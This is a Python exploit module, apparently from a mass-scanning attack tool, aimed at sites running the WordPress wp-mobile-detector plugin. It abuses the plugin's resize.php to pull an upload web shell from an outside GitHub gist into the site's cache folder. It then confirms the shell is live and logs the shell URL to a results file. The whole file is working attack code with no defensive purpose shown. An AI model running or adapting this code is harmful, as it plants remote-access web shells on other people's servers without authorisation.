
# coding=utf-8
import re
import requests
from core import printmodels

Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'
TextindeX = 'files/vuln.htm'

user = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"}


def URLdomain(site):
    if site.startswith("http://") :
        site = site.replace("http://","")
    elif site.startswith("https://"):
        site = site.replace("https://","")
    else :
        pass
    pattern = re.compile('(.*)/')
    while re.findall(pattern,site):
        sitez = re.findall(pattern,site)
        site = sitez[0]
    return site

def Exploit(site):
    i = 'http://'+URLdomain(site)
    try:
        url = i+ "/wp-content/plugins/wp-mobile-detector/resize.php?src=https://gist.githubusercontent.com/taterbase/2688850/raw/b9d214c9cbcf624e13c825d4de663e77bf38cc14/upload.php"
        shell = i + "/wp-content/plugins/wp-mobile-detector/cache/upload.php"
        r =requests.get(url,headers=user)
        ck = requests.get(shell,headers=user)
        if 'Upload your files' in ck.content:
            with open('result/Shell_results.txt', 'a') as writer:
                    writer.write(shell+'\n')
            return printmodels.returnYes(site, 'N/A', 'Wp_Mobile_Detector', 'Wordpress')
        else:
            return printmodels.returnNo(site, 'N/A', 'Wp_Mobile_Detector', 'Wordpress')
    except:
        return printmodels.returnNo(site, 'N/A', 'Wp_Mobile_Detector', 'Joomla')











